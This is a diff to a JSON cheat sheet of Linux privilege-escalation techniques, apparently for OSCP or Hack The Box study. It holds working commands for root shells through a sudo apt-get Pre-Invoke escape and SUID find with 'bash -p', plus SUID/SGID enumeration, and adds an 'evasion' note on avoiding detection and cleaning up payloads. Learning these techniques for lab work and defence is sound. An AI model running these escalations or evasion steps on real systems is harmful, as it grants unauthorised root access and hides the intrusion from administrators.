@@ -27,7 +27,7 @@
       "command": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
     },
     {
-      "label": "SUID find abuse \u2014 -exec bash -p drops euid=root shell (-p preserves SUID effective uid)",
+      "label": "SUID find abuse — -exec bash -p drops euid=root shell (-p preserves SUID effective uid)",
       "command": "find /home/<user>/Desktop -exec \"/usr/bin/bash\" -p \\;\n# bash-5.0# id -> uid=1000(joe) gid=1000(joe) euid=0(root)"
     },
     {
@@ -35,7 +35,7 @@
       "command": "ls -asl /usr/bin/find\n# 64 -rwsr-xr-x 1 root root 63736 ...  <- 's' in owner execute = SUID"
     },
     {
-      "label": "OSCP Ch17 \u2014 find all SUID binaries from root (Ch17 pattern)",
+      "label": "OSCP Ch17 — find all SUID binaries from root (Ch17 pattern)",
       "command": "find / -perm -u=s -type f 2>/dev/null"
     }
   ],
@@ -76,10 +76,6 @@
   "description": "Find root-owned SUID/SGID binaries, then check GTFOBins for an escalation technique (e.g. apt-get's Pre-Invoke shell escape).",
   "variations": [
     {
-      "label": "SUID (-4000)",
-      "command": "find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null"
-    },
-    {
       "label": "SGID (-6000)",
       "command": "find / -uid 0 -perm -6000 -type f 2>/dev/null\nfind / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null"
     }
@@ -102,6 +98,7 @@
     "sources": [
       "HTB M25",
       "MITRE T1548.001"
-    ]
+    ],
+    "evasion": "Use the GTFOBins invocation that runs in-place without dropping files; clean up any temporary payloads; a single setuid abuse is quieter than repeated attempts."
   }
 }
